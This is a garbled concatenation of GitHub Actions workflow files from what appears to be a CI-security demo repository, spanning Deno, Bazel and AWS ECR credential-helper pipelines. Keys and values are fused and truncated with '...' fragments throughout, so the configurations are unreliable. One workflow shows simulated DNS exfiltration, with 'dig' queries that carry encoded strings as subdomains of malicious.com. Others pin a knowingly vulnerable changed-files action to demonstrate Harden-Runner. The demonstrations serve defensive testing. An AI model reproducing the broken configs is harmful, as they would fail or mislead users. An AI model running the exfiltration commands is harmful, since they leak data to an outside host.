name: S ... secrets- name: ... ts reporuns-on ... -22.04'cross-compileCross-compile all variantsCross-c ... ariantsmake all-variants-in-dockermake al ... -dockername: C ... ariantsunit-test1.22'1.22'1.23'1.23'['1.22', '1.23']'macos-13''windows-2022'['ubunt ... -2022']go: ['1.22', '1.23']unit-test (${{ matrix.os }} / Go ${{ matrix.go }})unit-te ... .go }})${{ matrix.go }}go-vers ... x.go }}uses: a ... p-go@v5git-secrets:/home/huawei/github-actions-security/.github/workflows/awslabs_amazon-ecr-credential-helper__check-links.ymlCheck Links0 0 * * 3"0 0 * * 3"cron: " ... :00 UTC- cron: ... :00 UTCpaths.github/workflows/check-links.yml".githu ... ks.yml"- ".git ... ks.yml"paths:github.repository == 'awslabs/amazon-ecr-credential-helper'github. ... helper'lycheelycheeverse/lychee-action@v2.4.0lycheev ... @v2.4.0fail--exclude-path ecr-login/vendor --timeout 30 --no-progress './**/*.md'--exclu ... */*.md'formatmarkdownjobSummaryfail: trueuses: l ... @v2.4.0runs-on ... u-22.04name: Check Links/home/huawei/github-actions-security/.github/workflows/awslabs_amazon-ecr-credential-helper__codeql.ymlCodeQL Scan"CodeQL Scan""main"[ "main" ]branches: [ "main" ]25 21 * * 5'25 21 * * 5'cron: '25 21 * * 5'- cron: ...  * * 5'Analyzeactionsactions: readlanguage'go'[ 'go' ]language: [ 'go' ]${{ matrix.language }}${{ mat ... uage }}languag ... uage }}/language:${{matrix.language}}"/langu ... uage}}"categor ... uage}}"name: Analyzename: "CodeQL Scan"/home/huawei/github-actions-security/.github/workflows/awslabs_amazon-ecr-credential-helper__new-pull-requests.ymlNew Pull Requests"New Pull Requests"labelgithub.event.pull_request.draft == falsegithub. ... = falsepull-requests: writeconfiguration-path.github/new-pull-request-labels.yml'.githu ... ls.yml'sync-labelsconfigu ... ls.yml'if: git ... = falselabel:name: " ... quests"/home/huawei/github-actions-security/.github/workflows/awslabs_amazon-ecr-credential-helper__review-dependencies.ymlReview dependenciesrelease/**'release/**'['main' ... se/**']ecr-login/go.*'ecr-login/go.*'- 'ecr-login/go.*'branche ... se/**']reviewactions/dependency-review-action@v4actions ... tion@v4config-file./.github/dependency-review-config.yml'./.git ... ig.yml'comment-summary-in-prcomment ... y-in-pralwaysconfig- ... ig.yml'uses: a ... tion@v4review:/home/huawei/github-actions-security/.github/workflows/awslabs_git-secrets__test.yml"test"'master'- 'master'{}name: "test"/home/huawei/github-actions-security/.github/workflows/baseline_checks.yml"Build"step-security/harden-runner@int-shstep-se ... @int-shuses: s ... @int-shcrazy-max/ghaction-github-status@v4crazy-m ... atus@v4uses: c ... atus@v4get-npm-versionpackage-versionmartinbeentjes/npm-get-version-action@v1.3.1martinb ... @v1.3.1src/exfiltration-demosrc/exf ... on-demopath: s ... on-demoname: g ... version- uses: ... @int-shname: "Build"/home/huawei/github-actions-security/.github/workflows/bazelbuild_bazel__cherry-picker.ymlcherry-pickerclosed[closed][master]types: [closed]milestoned[closed, milestoned]types:  ... stoned]${{ secrets.BAZEL_IO_TOKEN }}cherry-picker-on-closedcherry- ... -closedgithub.event.action == 'closed' && github.event.sender.login == 'copybara-service[bot]'github. ... e[bot]'step-security/harden-runner@0634a2670c59f64b4a01f0f96f84700a4088b9f0step-se ... 088b9f0github.event.pull_requestgithub. ... requestRun cherrypicker on closed PRRun che ... osed PRbazelbuild/continuous-integration/actions/cherry_picker@1d07a9c9fb2f66a39e5430a70828ef6912e8b804bazelbu ... 2e8b804triggered-onpr-number${{ github.event.number }}${{ git ... mber }}is-prodTruetriggered-on: closedif: git ... requestgithub.event.issueRun cherrypicker on closed issueRun che ... d issue${{ github.event.issue.number }}if: git ... t.issueif: git ... e[bot]'cherry-picker-on-milestonedcherry- ... estonedgithub.event.action == 'milestoned'github. ... stoned'startsWith(github.event.issue.body, 'Forked from')startsW ...  from')Run cherrypicker on commentRun che ... commentcommented${{ github.event.issue.body }}${{ git ... body }}milestone-title${{ github.event.milestone.title }}${{ git ... itle }}milestoned-issue-numbermilesto ... -numbertrigger ... mmentedif: sta ...  from')startsWith(github.event.issue.body, '### Commit IDs')startsW ... t IDs')Run cherrypicker on demandRun che ...  demandondemandissue-title${{ github.event.issue.title }}issue-bodytrigger ... ndemandif: sta ... t IDs')if: git ... stoned'cherry- ... closed:name: cherry-picker/home/huawei/github-actions-security/.github/workflows/bazelbuild_bazel__labeler.ymlPR Labeler"PR Labeler""opened""reopened""ready_for_review"["opene ... eview"]types:  ... eview"]actions/labeler@8558fd74291d67161a8a78ce36a881fa63b766a9actions ... 3b766a9uses: a ...  v5.0.0${{ github.event.pull_request.draft == false && github.event.pull_request.user.login != 'bazel-io' }}${{ git ... -io' }}name: "PR Labeler"/home/huawei/github-actions-security/.github/workflows/bazelbuild_bazel__release-helper.ymlrelease-helperissue_commentcreatededited[created, edited]types:  ... edited]issue_comment:startsWith(github.event.comment.body, '@bazel-io ')startsW ... l-io ')Run helperbazelbuild/continuous-integration/actions/release-helper@1d07a9c9fb2f66a39e5430a70828ef6912e8b804tokentoken:  ... OKEN }}name: Run helperif: sta ... l-io ')release-helper:name: release-helper/home/huawei/github-actions-security/.github/workflows/bazelbuild_bazel__remove-labels.ymlRemove PR Labels"closed"["closed"]types: ["closed"]remove-labelactions-ecosystem/action-remove-labels@2ce5d41b4b6aa8503e285553f75ed56e0a40bae0actions ... a40bae0labelsawaiting-PR-merge
awaiting-reviewlabels: |uses: a ...  v1.3.0remove-label:name: R ...  Labels/home/huawei/github-actions-security/.github/workflows/bazelbuild_bazel__scorecard.ymlScorecard supply-chain securityScoreca ... ecuritybranch_protection_rulebranch_ ... on_rule18 9 * * 4'18 9 * * 4'cron: '18 9 * * 4'- cron: '18 9 * * 4'"master"[ "master" ]branche ... ster" ]branch_ ... n_rule:read-allanalysisScorecard analysis"Checkout code"actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683actions ... c9af683persist-credentialspersist ... : falsename: " ... t code"Run analysis"Run analysis"ossf/scorecard-action@f49aabe0b5af0936a0987cfb85d86b75731b0186ossf/sc ... 31b0186results_fileresults.sarifresults_formatsarifpublish_resultsresults ... s.sarifname: "Run analysis"Upload artifact"Upload artifact"actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02actions ... 607fa02SARIF filename: SARIF filename: " ... tifact"Upload to code-scanning"Upload ... anning"github/codeql-action/upload-sarif@60168efe1c415ce0f5521ea06d5c2062adbeed1bgithub/ ... dbeed1bsarif_filesarif_f ... s.sarifname: " ... anning"name: S ... nalysisanalysis:name: S ... ecurity/home/huawei/github-actions-security/.github/workflows/bazelbuild_bazel__stale.yml0 1 * * *'0 1 * * *'cron: '0 1 * * *'- cron: '0 1 * * *'Track and close stale issues/PRsTrack a ... ues/PRsactions/stale@5bef64f19d7facfb25b37b414482c7164d639639actions ... d639639430Thank you for contributing to the Bazel repository! This issue has been marked as stale since it has not had any activity in the last 1+ years. It will be closed in the next 90 days unless any other activity occurs. If you think this issue is still relevant and should stay open, please post any comment here and the issue will no longer be marked as stale.
This issue has been automatically closed due to inactivity. If you're still interested in pursuing this, please post `@bazelbuild/triage` in a comment here and we'll take a look. Thanks!
Thank you for contributing to the Bazel repository! This pull request has been marked as stale since it has not had any activity in the last 1+ years. It will be closed in the next 90 days unless any other activity occurs. If you think this PR is still relevant and should stay open, please post any comment here and the PR will no longer be marked as stale.
This pull request has been automatically closed due to inactivity. If you're still interested in pursuing this, please post `@bazelbuild/triage` in a comment here and we'll take a look. Thanks!
'stale'not stale,awaiting-bazeler,untriaged,P0,P1,P2,good first issue,help wanted'not st ... wanted'close-issue-reasonnot_planned"not_planned"not stale,awaiting-review,awaiting-PR-merge,P0,P1,P2'not st ... ,P1,P2'exempt-draft-pr500ascendingname: T ... ues/PRs/home/huawei/github-actions-security/.github/workflows/block-dns-exfiltration.yamlBlock DNS Exfiltration With Harden-RunnerBlock D ... -RunnerDeploygithub.com:443
Code Checkoutname: Code CheckoutDNS Data ExfiltrationDNS Dat ... trationdig wI25mMRFgqmHdg6Se7F3qcRPg6mHxTXgoroAcQcu0ukreCZVj3ccl1OE4nhT.malicious.com
dig AjgjtZpoQFBk3CA9x2ic1OL4X6cSAbpPGscvTcxlZshd52cmJz6vYf4voTmo.malicious.com
dig uVqkyYsy48uC9q6oZEirkVK7sdHaSCx5v5BitwaBnTjKsjlRamhW6vP1pXNu.malicious.com
dig M6VzSkW4v7KPE0SILITZxLnrrBJiSxRYb0hUBiFJdIz2VpBJwkNOH3MEhesc.malicious.com
dig xd2rqUt1L0RN8IbthvNkOCyhR2FHneUESSM12Gq6ToNxFZkFY0W5KWUnxLtN.malicious.com
name: D ... trationname: Deployname: B ... -Runner/home/huawei/github-actions-security/.github/workflows/changed-files-vulnerability-with-hr.ymlChanged-Files Vulnerability: With Harden-Runner"Change ... Runner"pull-requests: readchanged_filesTest changed-filesdisable-sudodisable-sudo: trueGet changed fileschanged-filestj-actions/changed-files@v40tj-acti ... les@v40name: G ... d filesList all changed filesList al ... d filesfor file in ${{ steps.changed-files.outputs.all_changed_files }}; do
  echo "$file was changed"
done
name: L ... d fileschanged_files:/home/huawei/github-actions-security/.github/workflows/changed-files-vulnerability-without-hr.ymlChanged-Files Vulnerability: Without Harden-Runner/home/huawei/github-actions-security/.github/workflows/denoland_deno__cargo_publish.ymlcargo_publishconcurrencygroup${{ github.workflow }}${{ git ... flow }}cancel-in-progressgroup:  ... flow }}cargo publishubuntu-24.04-xlCARGO_TERM_COLORRUST_BACKTRACEfullRUSTC_FORCE_INCREMENTALRUSTC_F ... EMENTALCARGO_T ...  alwaysConfigure gitgit config --global core.symlinks true
git config --global fetch.parallel 32
name: Configure gitClone repository${{ secrets.DENOBOT_PAT }}${{ sec ... _PAT }}submodulesrecursivedsherret/rust-toolchain-file@v1dsherre ... file@v1uses: d ... file@v1Install denodenoland/setup-deno@v2denolan ... deno@v2deno-versionv2.xdeno-version: v2.xname: Install denoCARGO_REGISTRY_TOKEN${{ secrets.CARGO_REGISTRY_TOKEN }}CARGO_R ... OKEN }}./tools/release/03_publish_crates.ts./tools ... ates.tsCreate release tag and check forward commit to mainCreate  ... to mainGH_WORKFLOW_ACTORGITHUB_ ... _PAT }}git config user.email "${{ github.actor }}@users.noreply.github.com"
git config user.name "${{ github.actor }}"
./tools/release/04_post_publish.ts
name: C ... to main- name: ... ure gitname: cargo publishname: cargo_publish/home/huawei/github-actions-security/.github/workflows/denoland_deno__ci.ymlci*'*'- '*'${{ github.workflow }}-${{ !contains(github.event.pull_request.labels.*.name, 'ci-test-flaky') && github.head_ref || github.run_id }}'${{ gi ... _id }}'group:  ... _id }}'pre_buildpre-buildskip_build${{ steps.check.outputs.skip_build }}'${{ st ... ild }}'skip_bu ... ild }}'git config --global core.symlinks true
git config --global fetch.parallel 32|-github.event.pull_request.draft == truegithub. ... == truefetch-depth: 5github.event.pull_request.draft == true && (!contains(github.event.pull_request.labels.*.name, 'ci-draft'))'github ... ft''))'GIT_MESSAGE=$(git log --format=%s -n 1 ${{github.event.after}})
echo Commit message: $GIT_MESSAGE
echo $GIT_MESSAGE | grep '\[ci\]' || (echo 'Exiting due to draft PR. Commit with [ci] to bypass or add the ci-draft label.' ; echo 'skip_build=true' >> $GITHUB_OUTPUT)id: checkname: pre-build${{ matrix.job }} ${{ matrix.profile }} ${{ matrix.os }}-${{ matrix.arch }}'${{ ma ... rch }}'- pre_build${{ needs.pre_build.outputs.skip_build != 'true' }}'${{ ne ... e'' }}'${{ matrix.runner }}'${{ ma ... ner }}'${{ (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/')) && 'build' || '' }}'${{ (g ... ''' }}'name: ' ... ''' }}'240defaultsrun:includemacosx86_64runnerjobprofileos: macos${{ (!contains(github.event.pull_request.labels.*.name, 'ci-full') && (github.event_name == 'pull_request')) && 'ubuntu-24.04' || 'macos-13' }}'${{ (! ... 3'' }}'skip${{ !contains(github.event.pull_request.labels.*.name, 'ci-full') && (github.event_name == 'pull_request') }}'${{ !c ... '') }}'${{ (!contains(github.event.pull_request.labels.*.name, 'ci-full') && (github.event_name == 'pull_request')) && 'ubuntu-24.04' || github.repository == 'denoland/deno' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/')) && 'ghcr.io/cirruslabs/macos-runner:sonoma' || 'macos-14' }}'${{ (! ... 4'' }}'windowsos: windows${{ (!contains(github.event.pull_request.labels.*.name, 'ci-full') && (github.event_name == 'pull_request')) && 'ubuntu-24.04' || github.repository == 'denoland/deno' && 'windows-2022-xl' || 'windows-2022' }}'${{ (! ... 2'' }}'linux${{ github.repository == 'denoland/deno' && 'ubuntu-24.04-xl' || 'ubuntu-24.04' }}'${{ gi ... 4'' }}'use_sysrootwpt${{ !startsWith(github.ref, 'refs/tags/') }}'${{ !s ... '') }}'os: linux${{ (!contains(github.event.pull_request.labels.*.name, 'ci-full') && (github.event_name == 'pull_request' && !contains(github.event.pull_request.labels.*.name, 'ci-bench'))) && 'ubuntu-24.04' || github.repository == 'denoland/deno' && 'ubuntu-24.04-xl' || 'ubuntu-24.04' }}bench${{ !contains(github.event.pull_request.labels.*.name, 'ci-full') && (github.event_name == 'pull_request' && !contains(github.event.pull_request.labels.*.name, 'ci-bench')) }}'${{ !c ... ')) }}'lintubicloud-standard-16-armubiclou ... -16-arm- os: macosinclude:${{ github.event_name == 'pull_request' || (github.ref != 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/')) }}'${{ gi ... ')) }}'RUST_LIB_BACKTRACE!(matrix.skip)'!(matrix.skip)'Clone submodule ./tests/util/stdClone s ... til/stdgit submodule update --init --recursive --depth=1 -- ./tests/util/stdgit sub ... til/stdname: C ... til/stdClone submodule ./tests/wpt/suiteClone s ... t/suitegit submodule update --init --recursive --depth=1 -- ./tests/wpt/suitegit sub ... t/suite!(matrix.skip) && (matrix.wpt)'!(matr ... x.wpt)'name: C ... t/suiteClone submodule ./tests/node_compat/runner/suiteClone s ... r/suitegit submodule update --init --recursive --depth=1 -- ./tests/node_compat/runner/suitegit sub ... r/suite!(matrix.skip) && (matrix.job == 'lint' && matrix.os == 'linux')'!(matr ... nux'')'name: C ... r/suiteClone submodule ./cli/bench/testdata/lsp_benchdataClone s ... nchdatagit submodule update --init --recursive --depth=1 -- ./cli/bench/testdata/lsp_benchdatagit sub ... nchdata!(matrix.skip) && (matrix.job == 'bench')'!(matr ... nch'')'name: C ... nchdataCreate source tarballs (release, linux)'Create ... linux)'!(matrix.skip) && (matrix.os == 'linux' &&
matrix.profile == 'release' &&
matrix.job == 'test' &&
github.repository == 'denoland/deno' &&
startsWith(github.ref, 'refs/tags/'))mkdir -p target/release
tar --exclude=".git*" --exclude=target --exclude=third_party/prebuilt \
    -czvf target/release/deno_src.tar.gz -C .. denoname: ' ... linux)'Cache Cargo homecirruslabs/cache@v4~/.cargo/.crates.toml
~/.cargo/.crates2.json
~/.cargo/bin
~/.cargo/registry/index
~/.cargo/registry/cache
~/.cargo/git/db56-cargo-home-${{ matrix.os }}-${{ matrix.arch }}-${{ hashFiles('Cargo.lock') }}'56-car ... '') }}'restore-keys56-cargo-home-${{ matrix.os }}-${{ matrix.arch }}-'56-car ... ch }}-'path: |-name: C ... go home!(matrix.skip) && (matrix.job == 'lint' || matrix.job == 'test' || matrix.job == 'bench')Install Denoif: '!( ... nch'')'Install Pythonactions/setup-python@v5actions ... thon@v5!(matrix.skip) && (matrix.job != 'lint' && (matrix.os != 'linux' || matrix.arch != 'aarch64'))'!(matr ... 64''))'name: Install PythonRemove unused versions of PythonRemove  ...  Python!(matrix.skip) && (matrix.job != 'lint' && (matrix.os != 'linux' || matrix.arch != 'aarch64') && (matrix.os == 'windows'))'!(matr ... ws''))'$env:PATH -split ";" |
  Where-Object { Test-Path "$_\python.exe" } |
  Select-Object -Skip 1 |
  ForEach-Object { Move-Item "$_" "$_.disabled" }name: R ...  Python!(matrix.skip) && (matrix.job == 'bench' || matrix.job == 'test')'!(matr ... est'')'Install Nodeif: '!( ... est'')'!(matrix.skip) && (matrix.profile == 'release' &&
matrix.job == 'test' &&
github.repository == 'denoland/deno' &&
(github.ref == 'refs/heads/main' ||
startsWith(github.ref, 'refs/tags/')))Authenticate with Google CloudAuthent ... e Cloudgoogle-github-actions/auth@v2google- ... auth@v2project_iddenolandcredentials_json${{ secrets.GCP_SA_KEY }}'${{ se ... KEY }}'export_environment_variablesexport_ ... riablescreate_credentials_filecreate_ ... ls_fileproject_id: denolandif: |-Setup gcloud (unix)!(matrix.skip) && (matrix.os != 'windows' &&
matrix.profile == 'release' &&
matrix.job == 'test' &&
github.repository == 'denoland/deno' &&
(github.ref == 'refs/heads/main' ||
startsWith(github.ref, 'refs/tags/')))google-github-actions/setup-gcloud@v2google- ... loud@v2name: S ...  (unix)Setup gcloud (windows)Setup g ... indows)!(matrix.skip) && (matrix.os == 'windows' &&
matrix.profile == 'release' &&
matrix.job == 'test' &&
github.repository == 'denoland/deno' &&
(github.ref == 'refs/heads/main' ||
startsWith(github.ref, 'refs/tags/')))CLOUDSDK_PYTHON${{env.pythonLocation}}\python.exe'${{env ... on.exe'CLOUDSD ... on.exe'name: S ... indows)Configure canary buildConfigu ... y build!(matrix.skip) && (matrix.job == 'test' &&
matrix.profile == 'release' &&
github.repository == 'denoland/deno' &&
github.ref == 'refs/heads/main')echo "DENO_CANARY=true" >> $GITHUB_ENVecho "D ... HUB_ENVname: C ... y build!(matrix.skip) && (matrix.use_sysroot)'!(matr ... sroot)'Set up incremental LTO and sysroot buildSet up  ... t build# Setting up sysroot
export DEBIAN_FRONTEND=noninteractive
# Avoid running man-db triggers, which sometimes takes several minutes
# to complete.
sudo apt-get -qq remove --purge -y man-db  > /dev/null 2> /dev/null
# Remove older clang before we install
sudo apt-get -qq remove   'clang-12*' 'clang-13*' 'clang-14*' 'clang-15*' 'clang-16*' 'clang-17*' 'clang-18*' 'llvm-12*' 'llvm-13*' 'llvm-14*' 'llvm-15*' 'llvm-16*' 'lld-12*' 'lld-13*' 'lld-14*' 'lld-15*' 'lld-16*' 'lld-17*' 'lld-18*' > /dev/null 2> /dev/null

# Install clang-XXX, lld-XXX, and debootstrap.
echo "deb http://apt.llvm.org/jammy/ llvm-toolchain-jammy-19 main" |
  sudo dd of=/etc/apt/sources.list.d/llvm-toolchain-jammy-19.list
curl https://apt.llvm.org/llvm-snapshot.gpg.key |
  gpg --dearmor                                 |
sudo dd of=/etc/apt/trusted.gpg.d/llvm-snapshot.gpg
sudo apt-get update
# this was unreliable sometimes, so try again if it fails
sudo apt-get install --no-install-recommends clang-19 lld-19 clang-tools-19 clang-format-19 clang-tidy-19 || echo 'Failed. Trying again.' && sudo apt-get clean && sudo apt-get update && sudo apt-get install --no-install-recommends clang-19 lld-19 clang-tools-19 clang-format-19 clang-tidy-19
# Fix alternatives
(yes '' | sudo update-alternatives --force --all) > /dev/null 2> /dev/null || true

clang-19 -c -o /tmp/memfd_create_shim.o tools/memfd_create_shim.c -fPIC

echo "Decompressing sysroot..."
wget -q https://github.com/denoland/deno_sysroot_build/releases/download/sysroot-20241030/sysroot-`uname -m`.tar.xz -O /tmp/sysroot.tar.xz
cd /
xzcat /tmp/sysroot.tar.xz | sudo tar -x
sudo mount --rbind /dev /sysroot/dev
sudo mount --rbind /sys /sysroot/sys
sudo mount --rbind /home /sysroot/home
sudo mount -t proc /proc /sysroot/proc
cd

echo "Done."

# Configure the build environment. Both Rust and Clang will produce
# llvm bitcode only, so we can use lld's incremental LTO support.

# Load the sysroot's env vars
echo "sysroot env:"
cat /sysroot/.env
. /sysroot/.env

# Important notes:
#   1. -ldl seems to be required to avoid a failure in FFI tests. This flag seems
#      to be in the Rust default flags in the smoketest, so uncertain why we need
#      to be explicit here.
#   2. RUSTFLAGS and RUSTDOCFLAGS must be specified, otherwise the doctests fail
#      to build because the object formats are not compatible.
echo "
CARGO_PROFILE_BENCH_INCREMENTAL=false
CARGO_PROFILE_RELEASE_INCREMENTAL=false
RUSTFLAGS<<__1
  -C linker-plugin-lto=true
  -C linker=clang-19
  -C link-arg=-fuse-ld=lld-19
  -C link-arg=-ldl
  -C link-arg=-Wl,--allow-shlib-undefined
  -C link-arg=-Wl,--thinlto-cache-dir=$(pwd)/target/release/lto-cache
  -C link-arg=-Wl,--thinlto-cache-policy,cache_size_bytes=700m
  -C link-arg=/tmp/memfd_create_shim.o
  --cfg tokio_unstable
  $RUSTFLAGS
__1
RUSTDOCFLAGS<<__1
  -C linker-plugin-lto=true
  -C linker=clang-19
  -C link-arg=-fuse-ld=lld-19
  -C link-arg=-ldl
  -C link-arg=-Wl,--allow-shlib-undefined
  -C link-arg=-Wl,--thinlto-cache-dir=$(pwd)/target/release/lto-cache
  -C link-arg=-Wl,--thinlto-cache-policy,cache_size_bytes=700m
  -C link-arg=/tmp/memfd_create_shim.o
  --cfg tokio_unstable
  $RUSTFLAGS
__1
CC=/usr/bin/clang-19
CFLAGS=$CFLAGS
" > $GITHUB_ENVif: '!( ... sroot)'Remove macOS cURL --ipv4 flagRemove  ... v4 flagcurl --version
which curl
cat /etc/hosts
rm ~/.curlrc || true!(matrix.skip) && (matrix.os == 'macos')'!(matr ... cos'')'name: R ... v4 flagInstall macOS aarch64 lldInstall ... h64 lld'${{ se ... KEN }}'GITHUB_ ... KEN }}'./tools/install_prebuilt.js ld64.lld./tools ... d64.lld!(matrix.skip) && (matrix.os == 'macos' && matrix.arch == 'aarch64')'!(matr ... h64'')'name: I ... h64 lldInstall rust-codesignInstall ... odesign./tools/install_prebuilt.js rcodesign
echo $GITHUB_WORKSPACE/third_party/prebuilt/mac >> $GITHUB_PATHname: I ... odesignLog versionsecho '*** Python'
command -v python && python --version || echo 'No python found or bad executable'
echo '*** Rust'
command -v rustc && rustc --version || echo 'No rustc found or bad executable'
echo '*** Cargo'
command -v cargo && cargo --version || echo 'No cargo found or bad executable'
echo '*** Deno'
command -v deno && deno --version || echo 'No deno found or bad executable'
echo '*** Node'
command -v node && node --version || echo 'No node found or bad executable'
echo '*** Installed packages'
command -v dpkg && dpkg -l || echo 'No dpkg found or bad executable'name: Log versionsInstall benchmark toolsInstall ... k tools./tools/install_prebuilt.js wrk hyperfine./tools ... perfinename: I ... k toolsRestore cache build output (PR)Restore ... ut (PR)actions/cache/restore@v4actions ... tore@v4!(matrix.skip) && (github.ref != 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/'))'!(matr ... s/''))'./target
!./target/*/gn_out
!./target/*/gn_root
!./target/*/*.zip
!./target/*/*.tar.gznever_saved56-cargo-target-${{ matrix.os }}-${{ matrix.arch }}-${{ matrix.profile }}-${{ matrix.job }}-'56-car ... ob }}-'name: R ... ut (PR)Apply and update mtime cacheApply a ... e cache!(matrix.skip) && (!startsWith(github.ref, 'refs/tags/'))./.github/mtime_cache./.gith ... e_cachecache-path./targetcache-path: ./targetname: A ... e cacheSet up playwright cacheSet up  ... t cache./.ms-playwrightplaywright-${{ runner.os }}-${{ runner.arch }}'playwr ... rch }}'path: . ... ywrightname: S ... t cachetest_format.jsdeno run --allow-write --allow-read --allow-run --allow-net ./tools/format.js --checkdeno ru ... --checkname: test_format.jsLint PR title!(matrix.skip) && (matrix.job == 'lint' && github.event_name == 'pull_request' && matrix.os == 'linux')PR_TITLE${{ github.event.pull_request.title }}'${{ gi ... tle }}'PR_TITL ... tle }}'deno run ./tools/verify_pr_title.js "$PR_TITLE"deno ru ... _TITLE"name: Lint PR titlelint.js!(matrix.skip) && (matrix.job == 'lint')'!(matr ... int'')'deno run --allow-write --allow-read --allow-run --allow-net --allow-env ./tools/lint.jsdeno ru ... lint.jsname: lint.jsjsdoc_checker.jsdeno run --allow-read --allow-env --allow-sys ./tools/jsdoc_checker.jsdeno ru ... cker.jsname: j ... cker.jsnode_compat/setup.ts --checknode_co ... --checkdeno run --allow-write --allow-read --allow-run=git ./tests/node_compat/runner/setup.ts --checkname: n ... --checkCheck tracing build!(matrix.skip) && (matrix.job == 'test' && matrix.profile == 'debug' && matrix.os == 'linux' && matrix.arch == 'x86_64')'!(matr ... _64'')'cargo check -p deno --features=lsp-tracingcargo c ... tracingCARGO_PROFILE_DEV_DEBUGCARGO_P ... V_DEBUGCARGO_P ... EBUG: 0name: C ... g buildBuild debug!(matrix.skip) && (matrix.job == 'test' && matrix.profile == 'debug')'!(matr ... bug'')'cargo build --locked --all-targets --features=panic-tracecargo b ... c-tracename: Build debugBuild release!(matrix.skip) && ((matrix.job == 'test' || matrix.job == 'bench') &&
matrix.profile == 'release' && (matrix.use_sysroot ||
github.repository == 'denoland/deno'))df -h
cargo build --release --locked --all-targets --features=panic-trace
df -hname: Build releaseCheck deno binary!(matrix.skip) && (matrix.job == 'test')target/${{ matrix.profile }}/deno eval "console.log(1+2)" | grep 3'target ... grep 3'NO_COLORNO_COLOR: 1name: C ...  binaryCheck deno binary (in sysroot)Check d ... ysroot)!(matrix.skip) && (matrix.job == 'test' && matrix.use_sysroot)sudo chroot /sysroot "$(pwd)/target/${{ matrix.profile }}/deno" --version'sudo c ... ersion'name: C ... ysroot)Generate symcachetarget/release/deno -A tools/release/create_symcache.ts ./deno.symcache
du -h deno.symcache
du -h target/release/denoname: G ... ymcacheUpload PR artifact (linux)Upload  ... (linux)!(matrix.skip) && (matrix.job == 'test' &&
matrix.profile == 'release' && (matrix.use_sysroot ||
(github.repository == 'denoland/deno' &&
(github.ref == 'refs/heads/main' ||
startsWith(github.ref, 'refs/tags/')))))deno-${{ matrix.os }}-${{ matrix.arch }}-${{ github.event.number }}'deno-$ ... ber }}'target/release/denoname: ' ... ber }}'name: U ... (linux)Pre-release (linux)!(matrix.skip) && (matrix.os == 'linux' &&
(matrix.job == 'test' || matrix.job == 'bench') &&
matrix.profile == 'release' &&
github.repository == 'denoland/deno')cd target/release
./deno -A ../../tools/release/create_symcache.ts deno-${{ matrix.arch }}-unknown-linux-gnu.symcache
strip ./deno
zip -r deno-${{ matrix.arch }}-unknown-linux-gnu.zip deno
shasum -a 256 deno-${{ matrix.arch }}-unknown-linux-gnu.zip > deno-${{ matrix.arch }}-unknown-linux-gnu.zip.sha256sum
strip ./denort
zip -r denort-${{ matrix.arch }}-unknown-linux-gnu.zip denort
shasum -a 256 denort-${{ matrix.arch }}-unknown-linux-gnu.zip > denort-${{ matrix.arch }}-unknown-linux-gnu.zip.sha256sum
./deno types > lib.deno.d.tsname: P ... (linux)Pre-release (mac)!(matrix.skip) && (matrix.os == 'macos' &&
matrix.job == 'test' &&
matrix.profile == 'release' &&
github.repository == 'denoland/deno')APPLE_CODESIGN_KEY${{ secrets.APPLE_CODESIGN_KEY }}APPLE_CODESIGN_PASSWORDAPPLE_C ... ASSWORD${{ secrets.APPLE_CODESIGN_PASSWORD }}'${{ se ... ORD }}'APPLE_C ... KEY }}'target/release/deno -A tools/release/create_symcache.ts target/release/deno-${{ matrix.arch }}-apple-darwin.symcache
strip -x -S target/release/deno
echo "Key is $(echo $APPLE_CODESIGN_KEY | base64 -d | wc -c) bytes"
rcodesign sign target/release/deno --code-signature-flags=runtime --p12-password="$APPLE_CODESIGN_PASSWORD" --p12-file=<(echo $APPLE_CODESIGN_KEY | base64 -d) --entitlements-xml-file=cli/entitlements.plist
cd target/release
zip -r deno-${{ matrix.arch }}-apple-darwin.zip deno
shasum -a 256 deno-${{ matrix.arch }}-apple-darwin.zip > deno-${{ matrix.arch }}-apple-darwin.zip.sha256sum
strip -x -S ./denort
zip -r denort-${{ matrix.arch }}-apple-darwin.zip denort
shasum -a 256 denort-${{ matrix.arch }}-apple-darwin.zip > denort-${{ matrix.arch }}-apple-darwin.zip.sha256sumname: P ... e (mac)Authenticate with Azure (windows)Authent ... indows)!(matrix.skip) && (matrix.os == 'windows' &&
matrix.job == 'test' &&
matrix.profile == 'release' &&
github.repository == 'denoland/deno' &&
(github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/')))azure/login@v1client-id${{ secrets.AZURE_CLIENT_ID }}'${{ se ... _ID }}'tenant-id${{ secrets.AZURE_TENANT_ID }}subscription-id${{ secrets.AZURE_SUBSCRIPTION_ID }}enable-AzPSSessionclient- ... _ID }}'name: A ... indows)Code sign deno.exe (windows)Code si ... indows)azure/trusted-signing-action@v0azure/t ... tion@v0endpointhttps://eus.codesigning.azure.net/'https: ... e.net/'trusted-signing-account-nametrusted ... nt-namedeno-cli-code-signingdeno-cl ... signingcertificate-profile-namecertifi ... le-namedeno-cli-code-signing-certdeno-cl ... ng-certfiles-foldertarget/releasefiles-folder-filterdeno.exefile-digestSHA256timestamp-rfc3161http://timestamp.acs.microsoft.com'http:/ ... ft.com'timestamp-digestexclude-environment-credentialexclude ... dentialexclude-workload-identity-credentialexclude-managed-identity-credentialexclude-shared-token-cache-credentialexclude-visual-studio-credentialexclude-visual-studio-code-credentialexclude-azure-cli-credentialendpoin ... e.net/'name: C ... indows)Verify signature (windows)Verify  ... indows)$SignTool = Get-ChildItem -Path "C:\Program Files*\Windows Kits\*\bin\*\x64\signtool.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
$SignToolPath = $SignTool.FullName
& $SignToolPath verify /pa /v target\release\deno.exename: V ... indows)Pre-release (windows)Pre-rel ... indows)!(matrix.skip) && (matrix.os == 'windows' &&
matrix.job == 'test' &&
matrix.profile == 'release' &&
github.repository == 'denoland/deno')Compress-Archive -CompressionLevel Optimal -Force -Path target/release/deno.exe -DestinationPath target/release/deno-${{ matrix.arch }}-pc-windows-msvc.zip
Get-FileHash target/release/deno-${{ matrix.arch }}-pc-windows-msvc.zip -Algorithm SHA256 | Format-List > target/release/deno-${{ matrix.arch }}-pc-windows-msvc.zip.sha256sum
